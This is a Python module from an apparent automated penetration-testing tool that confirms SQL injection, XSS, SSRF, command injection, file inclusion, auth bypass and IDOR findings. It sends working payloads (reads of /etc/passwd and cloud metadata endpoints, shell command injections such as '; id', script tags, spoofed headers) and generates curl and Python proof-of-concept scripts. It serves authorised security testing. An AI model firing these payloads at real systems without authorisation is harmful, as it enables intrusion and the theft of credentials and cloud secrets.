"""
AIPTX Validation Strategies - Per-Vulnerability Validation Logic

Each vulnerability type has a specific validation strategy that:
1. Generates appropriate PoC payloads
2. Executes the exploit
3. Analyzes the response for success indicators
4. Collects evidence

Supported vulnerability types:
- SQL Injection (error-based, time-based, union-based)
- XSS (reflected, stored, DOM)
- SSRF (with callback verification)
- RCE (command output verification)
- LFI/Path Traversal (known file content)
- Auth Bypass (access verification)
- IDOR (data access verification)
"""

from __future__ import annotations

import asyncio
import logging
import re
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import Any, Optional

from aipt_v2.agents.shared.finding_repository import Finding, VulnerabilityType
from aipt_v2.validation.evidence import Evidence, EvidenceCollector, EvidenceType
from aipt_v2.validation.executor import (
    ExploitExecutor,
    ExecutionContext,
    ExecutionResult,
    SandboxConfig,
)

logger = logging.getLogger(__name__)


@dataclass
class ValidationAttempt:
    """Record of a validation attempt."""
    payload: str
    success: bool
    confidence: float
    evidence: Optional[Evidence] = None
    error: Optional[str] = None
    details: str = ""


@dataclass
class StrategyResult:
    """Result from a validation strategy."""
    validated: bool = False
    confidence: float = 0.0
    poc_code: str = ""
    poc_type: str = ""
    evidence: list[Evidence] = None
    attempts: list[ValidationAttempt] = None
    notes: str = ""

    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []
        if self.attempts is None:
            self.attempts = []


class ValidationStrategy(ABC):
    """
    Base class for vulnerability validation strategies.

    Each strategy knows how to:
    1. Generate payloads for the vulnerability type
    2. Execute the exploit safely
    3. Analyze results for success
    4. Collect appropriate evidence
    """

    vuln_type: VulnerabilityType = VulnerabilityType.OTHER
    name: str = "BaseStrategy"

    def __init__(
        self,
        executor: Optional[ExploitExecutor] = None,
        max_attempts: int = 5,
        timeout: float = 30.0,
    ):
        self.executor = executor or ExploitExecutor()
        self.max_attempts = max_attempts
        self.timeout = timeout

    @abstractmethod
    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """
        Validate a finding.

        Args:
            finding: Finding to validate
            collector: Evidence collector

        Returns:
            StrategyResult with validation outcome
        """
        pass

    @abstractmethod
    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """
        Get payloads for this vulnerability type.

        Args:
            finding: Finding to generate payloads for

        Returns:
            List of (payload, description) tuples
        """
        pass

    def generate_poc_code(
        self,
        finding: Finding,
        successful_payload: str,
        poc_type: str = "curl",
    ) -> str:
        """Generate PoC code for successful exploit."""
        if poc_type == "curl":
            return self._generate_curl_poc(finding, successful_payload)
        elif poc_type == "python":
            return self._generate_python_poc(finding, successful_payload)
        else:
            return f"# Payload: {successful_payload}"

    def _generate_curl_poc(self, finding: Finding, payload: str) -> str:
        """Generate curl command for PoC."""
        url = finding.url or finding.target
        param = finding.parameter

        if param:
            # URL encode the payload
            import urllib.parse
            encoded = urllib.parse.quote(payload, safe="")
            return f"curl '{url}?{param}={encoded}'"
        else:
            return f"curl -d '{payload}' '{url}'"

    def _generate_python_poc(self, finding: Finding, payload: str) -> str:
        """Generate Python script for PoC."""
        url = finding.url or finding.target
        param = finding.parameter

        return f'''#!/usr/bin/env python3
import requests

url = "{url}"
payload = """{payload}"""

{"params = {'" + param + "': payload}" if param else "data = payload"}
response = requests.{"get(url, params=params)" if param else "post(url, data=data)"}

print(f"Status: {{response.status_code}}")
print(response.text[:500])
'''


class SQLiValidationStrategy(ValidationStrategy):
    """
    SQL Injection validation strategy.

    Validates using:
    1. Error-based detection (SQL error messages)
    2. Time-based detection (response delay)
    3. Boolean-based detection (different responses)
    4. Union-based detection (data extraction)
    """

    vuln_type = VulnerabilityType.SQLI
    name = "SQLi Validation"

    # SQL error patterns by database
    ERROR_PATTERNS = {
        "mysql": [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"pg_query\(\) :",
            r"PSQLException",
        ],
        "mssql": [
            r"Microsoft OLE DB Provider for SQL Server",
            r"ODBC SQL Server Driver",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark",
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"Oracle error",
            r"oracle\.jdbc",
        ],
        "sqlite": [
            r"SQLite\/",
            r"sqlite_",
            r"sqlite3\.",
        ],
    }

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get SQLi payloads."""
        original_value = finding.metadata.get("original_value", "1")

        return [
            # Error-based
            ("'", "Single quote - error detection"),
            ('"', "Double quote - error detection"),
            ("'--", "Comment - error detection"),

            # Boolean-based
            (f"{original_value}' AND '1'='1", "Boolean true condition"),
            (f"{original_value}' AND '1'='2", "Boolean false condition"),
            (f"{original_value}' OR '1'='1", "Boolean OR true"),

            # Time-based (MySQL)
            (f"{original_value}' AND SLEEP(5)--", "Time-based MySQL SLEEP"),
            (f"{original_value}'; WAITFOR DELAY '0:0:5'--", "Time-based MSSQL"),
            (f"{original_value}' AND pg_sleep(5)--", "Time-based PostgreSQL"),

            # Union-based
            (f"{original_value}' UNION SELECT NULL--", "Union NULL test"),
            (f"{original_value}' UNION SELECT 1,2,3--", "Union column count"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate SQL injection."""
        result = StrategyResult()
        payloads = self.get_payloads(finding)

        # First, get baseline response
        baseline_ctx = ExecutionContext(
            target=finding.url or finding.target,
            finding_id=finding.id,
            payload="",
            method=finding.metadata.get("method", "GET"),
            extra_config={"param_name": finding.parameter},
        )
        baseline = await self.executor.execute(baseline_ctx)

        for payload, description in payloads[:self.max_attempts]:
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=payload,
                    method=finding.metadata.get("method", "GET"),
                    extra_config={"param_name": finding.parameter},
                )

                # Check for time-based
                if "SLEEP" in payload or "WAITFOR" in payload or "pg_sleep" in payload:
                    is_valid, confidence = await self._validate_time_based(
                        ctx, baseline, collector
                    )
                else:
                    is_valid, confidence = await self._validate_error_based(
                        ctx, collector
                    )

                attempt = ValidationAttempt(
                    payload=payload,
                    success=is_valid,
                    confidence=confidence,
                    details=description,
                )
                result.attempts.append(attempt)

                if is_valid and confidence > 0.7:
                    result.validated = True
                    result.confidence = confidence
                    result.poc_code = self.generate_poc_code(finding, payload)
                    result.poc_type = "curl"
                    result.notes = f"Validated via {description}"
                    break

            except Exception as e:
                logger.warning(f"SQLi validation error with {description}: {e}")
                result.attempts.append(ValidationAttempt(
                    payload=payload,
                    success=False,
                    confidence=0,
                    error=str(e),
                ))

        result.evidence = collector.get_evidence()
        return result

    async def _validate_error_based(
        self,
        ctx: ExecutionContext,
        collector: EvidenceCollector,
    ) -> tuple[bool, float]:
        """Validate using error-based detection."""
        exec_result = await self.executor.execute(ctx)

        if not exec_result.success:
            return False, 0.0

        body = exec_result.response_body.lower()

        # Check for SQL errors
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, exec_result.response_body, re.IGNORECASE):
                    # Found SQL error - capture evidence
                    await collector.capture_http(
                        method=ctx.method,
                        url=ctx.target,
                        request_headers={},
                        request_body=ctx.payload,
                        response_status=exec_result.status_code,
                        response_headers=exec_result.response_headers,
                        response_body=exec_result.response_body,
                        response_time_ms=exec_result.response_time_ms,
                        description=f"SQL error ({db_type}) triggered by payload",
                    )
                    return True, 0.9

        return False, 0.0

    async def _validate_time_based(
        self,
        ctx: ExecutionContext,
        baseline: ExecutionResult,
        collector: EvidenceCollector,
    ) -> tuple[bool, float]:
        """Validate using time-based detection."""
        exec_result = await self.executor.execute(ctx)

        if not exec_result.success:
            return False, 0.0

        time_diff = exec_result.response_time_ms - baseline.response_time_ms

        # If response took significantly longer (4+ seconds for 5s sleep)
        if time_diff >= 4000:
            await collector.capture_timing(
                baseline_ms=baseline.response_time_ms,
                delayed_ms=exec_result.response_time_ms,
                expected_delay_ms=5000,
                description="Time-based SQL injection confirmed",
            )
            return True, 0.85

        return False, 0.0


class XSSValidationStrategy(ValidationStrategy):
    """
    XSS validation strategy.

    Validates using:
    1. Payload reflection check
    2. DOM execution verification (with browser)
    3. Context analysis (HTML, attribute, JS)
    """

    vuln_type = VulnerabilityType.XSS
    name = "XSS Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get XSS payloads."""
        return [
            # Basic script tags
            ("<script>alert('XSS')</script>", "Basic script tag"),
            ("'\"><script>alert('XSS')</script>", "Quote escape + script"),

            # Event handlers
            ("<img src=x onerror=alert('XSS')>", "IMG onerror"),
            ("<svg onload=alert('XSS')>", "SVG onload"),
            ("<body onload=alert('XSS')>", "Body onload"),

            # JavaScript protocol
            ("javascript:alert('XSS')", "JavaScript protocol"),

            # Encoded payloads
            ("<script>alert(String.fromCharCode(88,83,83))</script>", "Encoded payload"),

            # Attribute context
            ("\" onmouseover=\"alert('XSS')\" x=\"", "Attribute injection"),
            ("' onfocus='alert(1)' autofocus='", "Autofocus onfocus"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate XSS."""
        result = StrategyResult()
        payloads = self.get_payloads(finding)

        for payload, description in payloads[:self.max_attempts]:
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=payload,
                    method=finding.metadata.get("method", "GET"),
                    extra_config={"param_name": finding.parameter},
                )

                exec_result = await self.executor.execute(ctx)

                if not exec_result.success:
                    continue

                # Check if payload is reflected without encoding
                is_reflected, confidence = self._check_reflection(
                    payload, exec_result.response_body
                )

                attempt = ValidationAttempt(
                    payload=payload,
                    success=is_reflected,
                    confidence=confidence,
                    details=description,
                )
                result.attempts.append(attempt)

                if is_reflected and confidence > 0.7:
                    # Capture evidence
                    await collector.capture_http(
                        method=ctx.method,
                        url=ctx.target,
                        request_headers={},
                        request_body=None,
                        response_status=exec_result.status_code,
                        response_headers=exec_result.response_headers,
                        response_body=exec_result.response_body,
                        response_time_ms=exec_result.response_time_ms,
                        description=f"XSS payload reflected: {description}",
                    )

                    result.validated = True
                    result.confidence = confidence
                    result.poc_code = self.generate_poc_code(finding, payload)
                    result.poc_type = "curl"
                    result.notes = f"Validated: {description}"
                    break

            except Exception as e:
                logger.warning(f"XSS validation error: {e}")
                result.attempts.append(ValidationAttempt(
                    payload=payload,
                    success=False,
                    confidence=0,
                    error=str(e),
                ))

        result.evidence = collector.get_evidence()
        return result

    def _check_reflection(self, payload: str, response: str) -> tuple[bool, float]:
        """Check if payload is reflected without encoding."""
        if payload in response:
            # Check if it's actually executable (not HTML encoded)
            dangerous_patterns = [
                "<script", "onerror=", "onload=", "onfocus=",
                "javascript:", "onmouseover=",
            ]

            for pattern in dangerous_patterns:
                if pattern.lower() in payload.lower() and pattern.lower() in response.lower():
                    return True, 0.85

        # Check for partial reflection
        if "<script" in payload and "<script" in response:
            return True, 0.7

        return False, 0.0


class SSRFValidationStrategy(ValidationStrategy):
    """
    SSRF validation strategy.

    Validates using:
    1. Callback server (out-of-band detection)
    2. Cloud metadata access
    3. Internal service probing
    """

    vuln_type = VulnerabilityType.SSRF
    name = "SSRF Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get SSRF payloads."""
        return [
            # Cloud metadata
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            ("http://169.254.169.254/latest/meta-data/ami-id", "AWS AMI ID"),
            ("http://metadata.google.internal/", "GCP metadata"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata v1"),

            # Internal services
            ("http://localhost:22", "Local SSH"),
            ("http://127.0.0.1:80", "Local HTTP"),
            ("http://127.0.0.1:3306", "Local MySQL"),
            ("http://127.0.0.1:6379", "Local Redis"),

            # File protocol
            ("file:///etc/passwd", "File protocol passwd"),
            ("file:///etc/hosts", "File protocol hosts"),

            # DNS rebinding placeholder
            ("http://callback.aiptx.io/ssrf", "Callback server"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate SSRF."""
        result = StrategyResult()
        payloads = self.get_payloads(finding)

        # Indicators of successful SSRF
        success_indicators = {
            "aws_metadata": ["ami-id", "instance-id", "local-hostname"],
            "gcp_metadata": ["computeMetadata", "project/project-id"],
            "file_read": ["root:x:0:0", "localhost", "127.0.0.1"],
            "service_banner": ["SSH-2.0", "MySQL", "Redis", "HTTP/1."],
        }

        for payload, description in payloads[:self.max_attempts]:
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=payload,
                    method=finding.metadata.get("method", "GET"),
                    extra_config={"param_name": finding.parameter},
                )

                exec_result = await self.executor.execute(ctx)

                if not exec_result.success:
                    continue

                # Check for success indicators
                is_valid, indicator_type = self._check_ssrf_success(
                    exec_result.response_body, success_indicators
                )

                attempt = ValidationAttempt(
                    payload=payload,
                    success=is_valid,
                    confidence=0.9 if is_valid else 0,
                    details=f"{description} - {indicator_type}" if is_valid else description,
                )
                result.attempts.append(attempt)

                if is_valid:
                    await collector.capture_http(
                        method=ctx.method,
                        url=ctx.target,
                        request_headers={},
                        request_body=None,
                        response_status=exec_result.status_code,
                        response_headers=exec_result.response_headers,
                        response_body=exec_result.response_body,
                        response_time_ms=exec_result.response_time_ms,
                        description=f"SSRF confirmed: {indicator_type}",
                    )

                    result.validated = True
                    result.confidence = 0.9
                    result.poc_code = self.generate_poc_code(finding, payload)
                    result.poc_type = "curl"
                    result.notes = f"SSRF to {indicator_type}"
                    break

            except Exception as e:
                logger.warning(f"SSRF validation error: {e}")

        result.evidence = collector.get_evidence()
        return result

    def _check_ssrf_success(
        self,
        response: str,
        indicators: dict,
    ) -> tuple[bool, str]:
        """Check response for SSRF success indicators."""
        for indicator_type, patterns in indicators.items():
            for pattern in patterns:
                if pattern in response:
                    return True, indicator_type
        return False, ""


class RCEValidationStrategy(ValidationStrategy):
    """
    Remote Code Execution validation strategy.

    Validates using:
    1. Command output verification
    2. Time-based detection
    3. Out-of-band callbacks
    """

    vuln_type = VulnerabilityType.RCE
    name = "RCE Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get RCE payloads."""
        return [
            # Unix commands
            ("; id", "Unix id command"),
            ("| id", "Pipe to id"),
            ("`id`", "Backtick id"),
            ("$(id)", "Command substitution"),
            ("; cat /etc/passwd", "Read passwd"),

            # Windows commands
            ("& whoami", "Windows whoami"),
            ("| whoami", "Pipe to whoami"),

            # Time-based
            ("; sleep 5", "Sleep command"),
            ("| sleep 5", "Pipe to sleep"),
            ("& ping -n 5 127.0.0.1", "Windows ping delay"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate RCE."""
        result = StrategyResult()
        payloads = self.get_payloads(finding)

        # Get baseline for time-based detection
        baseline_ctx = ExecutionContext(
            target=finding.url or finding.target,
            finding_id=finding.id,
            payload="",
            method=finding.metadata.get("method", "GET"),
            extra_config={"param_name": finding.parameter},
        )
        baseline = await self.executor.execute(baseline_ctx)

        # Command output indicators
        rce_indicators = [
            r"uid=\d+",           # Unix id output
            r"gid=\d+",           # Unix id output
            r"root:x:0:0",        # passwd file
            r"\\[a-zA-Z]+\\",     # Windows domain\user
            r"nt authority",      # Windows system user
        ]

        for payload, description in payloads[:self.max_attempts]:
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=payload,
                    method=finding.metadata.get("method", "POST"),
                    extra_config={"param_name": finding.parameter},
                )

                exec_result = await self.executor.execute(ctx)

                if not exec_result.success:
                    continue

                is_valid = False
                confidence = 0.0

                # Check for command output
                for pattern in rce_indicators:
                    if re.search(pattern, exec_result.response_body, re.IGNORECASE):
                        is_valid = True
                        confidence = 0.95
                        break

                # Check for time-based
                if "sleep" in payload.lower():
                    time_diff = exec_result.response_time_ms - baseline.response_time_ms
                    if time_diff >= 4000:
                        is_valid = True
                        confidence = 0.85

                attempt = ValidationAttempt(
                    payload=payload,
                    success=is_valid,
                    confidence=confidence,
                    details=description,
                )
                result.attempts.append(attempt)

                if is_valid:
                    await collector.capture_command_output(
                        output=exec_result.response_body[:1000],
                        command=payload,
                        description=f"RCE confirmed: {description}",
                    )

                    result.validated = True
                    result.confidence = confidence
                    result.poc_code = self.generate_poc_code(finding, payload, "python")
                    result.poc_type = "python"
                    result.notes = description
                    break

            except Exception as e:
                logger.warning(f"RCE validation error: {e}")

        result.evidence = collector.get_evidence()
        return result


class LFIValidationStrategy(ValidationStrategy):
    """
    Local File Inclusion validation strategy.

    Validates by reading known files.
    """

    vuln_type = VulnerabilityType.LFI
    name = "LFI Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get LFI payloads."""
        return [
            # Unix files
            ("../../../etc/passwd", "Relative etc/passwd"),
            ("/etc/passwd", "Absolute etc/passwd"),
            ("....//....//....//etc/passwd", "Double encoding"),
            ("..%2f..%2f..%2fetc/passwd", "URL encoded"),
            ("/etc/hosts", "etc/hosts"),

            # Windows files
            ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
            ("C:\\windows\\win.ini", "Absolute win.ini"),

            # Application files
            ("../../../proc/self/environ", "Process environ"),
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate LFI."""
        result = StrategyResult()
        payloads = self.get_payloads(finding)

        # Known file content patterns
        file_patterns = {
            "passwd": r"root:x:0:0",
            "hosts": r"127\.0\.0\.1\s+localhost",
            "win.ini": r"\[fonts\]",
            "environ": r"PATH=|HOME=",
        }

        for payload, description in payloads[:self.max_attempts]:
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=payload,
                    method=finding.metadata.get("method", "GET"),
                    extra_config={"param_name": finding.parameter},
                )

                exec_result = await self.executor.execute(ctx)

                if not exec_result.success:
                    continue

                # Check for file content
                is_valid = False
                matched_file = ""
                for file_type, pattern in file_patterns.items():
                    if re.search(pattern, exec_result.response_body):
                        is_valid = True
                        matched_file = file_type
                        break

                attempt = ValidationAttempt(
                    payload=payload,
                    success=is_valid,
                    confidence=0.9 if is_valid else 0,
                    details=description,
                )
                result.attempts.append(attempt)

                if is_valid:
                    await collector.capture_file_content(
                        content=exec_result.response_body[:2000],
                        filename=matched_file,
                        description=f"LFI confirmed: read {matched_file}",
                    )

                    result.validated = True
                    result.confidence = 0.9
                    result.poc_code = self.generate_poc_code(finding, payload)
                    result.poc_type = "curl"
                    result.notes = f"Read {matched_file}"
                    break

            except Exception as e:
                logger.warning(f"LFI validation error: {e}")

        result.evidence = collector.get_evidence()
        return result


class AuthBypassValidationStrategy(ValidationStrategy):
    """Authentication bypass validation strategy."""

    vuln_type = VulnerabilityType.AUTH_BYPASS
    name = "Auth Bypass Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get auth bypass techniques."""
        return [
            ("X-Forwarded-For: 127.0.0.1", "X-Forwarded-For localhost"),
            ("X-Original-URL: /admin", "X-Original-URL bypass"),
            ("X-Rewrite-URL: /admin", "X-Rewrite-URL bypass"),
            ("X-Custom-IP-Authorization: 127.0.0.1", "Custom IP header"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate auth bypass."""
        result = StrategyResult()

        # Admin/protected content indicators
        protected_indicators = [
            "admin", "dashboard", "settings", "management",
            "configuration", "users", "delete", "create"
        ]

        for header, description in self.get_payloads(finding):
            try:
                header_name, header_value = header.split(": ", 1)

                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload="",
                    method="GET",
                    headers={header_name: header_value},
                )

                exec_result = await self.executor.execute(ctx)

                if exec_result.status_code == 200:
                    body_lower = exec_result.response_body.lower()
                    if any(ind in body_lower for ind in protected_indicators):
                        await collector.capture_http(
                            method="GET",
                            url=ctx.target,
                            request_headers={header_name: header_value},
                            request_body=None,
                            response_status=exec_result.status_code,
                            response_headers=exec_result.response_headers,
                            response_body=exec_result.response_body,
                            response_time_ms=exec_result.response_time_ms,
                            description=f"Auth bypass via {description}",
                        )

                        result.validated = True
                        result.confidence = 0.85
                        result.poc_code = f"curl -H '{header}' '{ctx.target}'"
                        result.poc_type = "curl"
                        result.notes = description
                        break

            except Exception as e:
                logger.warning(f"Auth bypass validation error: {e}")

        result.evidence = collector.get_evidence()
        return result


class IDORValidationStrategy(ValidationStrategy):
    """IDOR validation strategy."""

    vuln_type = VulnerabilityType.IDOR
    name = "IDOR Validation"

    def get_payloads(self, finding: Finding) -> list[tuple[str, str]]:
        """Get IDOR test values."""
        return [
            ("1", "ID 1"),
            ("2", "ID 2"),
            ("0", "ID 0"),
            ("admin", "Admin ID"),
            ("test", "Test ID"),
        ]

    async def validate(
        self,
        finding: Finding,
        collector: EvidenceCollector,
    ) -> StrategyResult:
        """Validate IDOR."""
        result = StrategyResult()
        responses = {}

        for test_id, description in self.get_payloads(finding):
            try:
                ctx = ExecutionContext(
                    target=finding.url or finding.target,
                    finding_id=finding.id,
                    payload=test_id,
                    method="GET",
                    extra_config={"param_name": finding.parameter},
                )

                exec_result = await self.executor.execute(ctx)
                responses[test_id] = exec_result

            except Exception as e:
                logger.warning(f"IDOR validation error: {e}")

        # Compare responses - different data for different IDs = IDOR
        if len(responses) >= 2:
            bodies = [r.response_body for r in responses.values() if r.success]
            if len(set(bodies)) > 1:
                result.validated = True
                result.confidence = 0.8
                result.notes = "Different responses for different IDs"

                # Get first successful response for evidence
                for test_id, r in responses.items():
                    if r.success:
                        await collector.capture_http(
                            method="GET",
                            url=finding.url or finding.target,
                            request_headers={},
                            request_body=None,
                            response_status=r.status_code,
                            response_headers=r.response_headers,
                            response_body=r.response_body,
                            response_time_ms=r.response_time_ms,
                            description=f"IDOR: accessed data with ID={test_id}",
                        )
                        break

        result.evidence = collector.get_evidence()
        return result


# Strategy registry
STRATEGY_REGISTRY: dict[VulnerabilityType, type[ValidationStrategy]] = {
    VulnerabilityType.SQLI: SQLiValidationStrategy,
    VulnerabilityType.XSS: XSSValidationStrategy,
    VulnerabilityType.SSRF: SSRFValidationStrategy,
    VulnerabilityType.RCE: RCEValidationStrategy,
    VulnerabilityType.COMMAND_INJECTION: RCEValidationStrategy,
    VulnerabilityType.LFI: LFIValidationStrategy,
    VulnerabilityType.PATH_TRAVERSAL: LFIValidationStrategy,
    VulnerabilityType.AUTH_BYPASS: AuthBypassValidationStrategy,
    VulnerabilityType.IDOR: IDORValidationStrategy,
}


def get_strategy_for_vuln_type(
    vuln_type: VulnerabilityType,
) -> Optional[ValidationStrategy]:
    """
    Get validation strategy for a vulnerability type.

    Args:
        vuln_type: Vulnerability type

    Returns:
        Validation strategy instance or None
    """
    strategy_class = STRATEGY_REGISTRY.get(vuln_type)
    if strategy_class:
        return strategy_class()
    return None
